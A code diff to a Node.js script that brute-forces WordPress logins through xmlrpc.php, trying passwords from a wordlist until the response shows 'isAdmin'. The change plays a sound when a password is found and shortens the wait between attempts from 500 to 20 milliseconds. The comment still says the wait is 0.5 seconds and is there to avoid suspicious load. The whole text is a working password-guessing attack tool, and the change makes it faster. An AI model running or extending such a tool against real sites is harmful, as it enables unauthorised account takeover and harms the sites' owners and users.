@@ -1,5 +1,8 @@
 const axios = require('axios')
 const wait = require('waait')
+const player = require('play-sound')((opts = {}))
+
+const TIMEOUT = 20
 
 // Make asynchronous POST request to xmlrpc.php
 const login = async (url, username, password) => {
@@ -34,13 +37,16 @@ const attack = async (url, username, wordlist) => {
 
   await asyncForEach(passwords, async password => {
     // Wait 0.5sec before each request, so we don't cause any suspicious performance problems
-    await wait(500)
+    await wait(TIMEOUT)
 
     const result = await login(target, username, password)
 
     if (result.data.includes('403')) {
       console.log(`[i] Trying ${username} / ${password}`)
     } else if (result.data.includes('isAdmin')) {
+      player.play('success.mp3', function(err) {
+        if (err) throw err
+      })
       console.log(`\n[✓] Password found for ${username}: ${password}`)
       process.exit(0)
     }
